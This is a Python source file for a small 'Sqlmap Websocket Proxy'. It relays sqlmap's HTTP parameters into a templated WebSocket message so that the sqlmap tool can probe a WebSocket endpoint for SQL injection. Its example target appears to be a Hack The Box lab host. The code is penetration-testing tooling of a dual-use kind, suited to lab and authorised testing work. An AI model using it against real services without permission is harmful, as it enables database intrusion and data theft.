import argparse
import rich
import re
import socketserver
import sys
import websocket
from datetime import datetime
from functools import partial
from http.server import SimpleHTTPRequestHandler
from urllib.parse import parse_qsl, unquote
# ---------------------------------------------------------------------------------------------------------------------
def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

# ---------------------------------------------------------------------------------------------------------------------
def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")


# ---------------------------------------------------------------------------------------------------------------------
class PayloadHandler(SimpleHTTPRequestHandler):
    # -----------------------------------------------------------------------------------------------------------------
    def __init__(self, url: str, payload: str, is_json: bool, *args, **kwargs):
        self.url = url
        self.payload = payload
        self.is_json = is_json
        super().__init__(*args, **kwargs)
    # -----------------------------------------------------------------------------------------------------------------
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(self.send_payload(self.path).encode())
        return
    
    # -----------------------------------------------------------------------------------------------------------------
    def log_message(self, format, *args):
        pass

    # ---------------------------------------------------------------------------------------------------------------------
    def send_payload(self, path: str) -> str:
        params = [x for _, x in parse_qsl(path)]
        payload = self.payload
        
        if self.is_json:
            params = [unquote(x).replace('"',"'") for x in params]
        
        for idx, x in enumerate(params):
            payload = payload.replace("%param%", x, 1)

        try:
            ws = websocket.create_connection(self.url)
        except Exception as e:
            error(f"Websocket Connection Failed: {e}")

        try:
            ws.send(payload)
            rich.print(f"[{datetime.now().strftime('%H:%M:%S')}] Proxied: {payload}")    
            data = ws.recv()
            return data if data else ""
        except Exception as e:
            rich.print("  [bright yellow]Request Failed[/bright yellow]")
        finally:
            ws.close()

# ---------------------------------------------------------------------------------------------------------------------
def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="URL to the websocket (example: soc-player.soccer.htb:9091)")
    parser.add_argument('-p', "--payload", required=True, help="String with params for the playload encoded as %%param%% (example: {\"id\": \"%%param%%\"})")
    parser.add_argument('-o', "--port", type=int, default=8080, help="Proxy Port (default: 8080)")
    parser.add_argument("--json", action="store_true", help="Escape text for JSON payloads")
    args = parser.parse_args()

    if not args.url.startswith("ws://"):
        args.url = f"ws://{args.url}"

    rich.print("💉 Sqlmap Websocket Proxy")
    status(f"Proxy Port: {args.port}", prefix="\t")
    status(f"URL: {args.url}", prefix="\t")
    status(f"Payload: {args.payload}", prefix="\t")
    status(f"JSON Escaping: {'Enabled' if args.json else 'Disabled'}", prefix="\t")
        

    params = [match.start() for match in re.finditer(r"%param%", args.payload)]
    if not len(params):
        error("No Injectable Parameters Found :(")
    
    status(f"Targeting {len(params)} injectable parameter(s)", prefix="\t")
    param_str = "&".join([f"param{x}=1" for x in range(1,len(params)+1)])

    success(f"sqlmap url flag: -u http://localhost:{args.port}/?{param_str}")

    try:
        handler = partial(PayloadHandler, args.url, args.payload, args.json)
        with socketserver.TCPServer(("", args.port), handler) as httpd:    
            status("Server Started (Ctrl+C to stop)\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        status("Quitting...")
        sys.exit(0)
    except Exception as e:
        error(f"Exception: {e}")
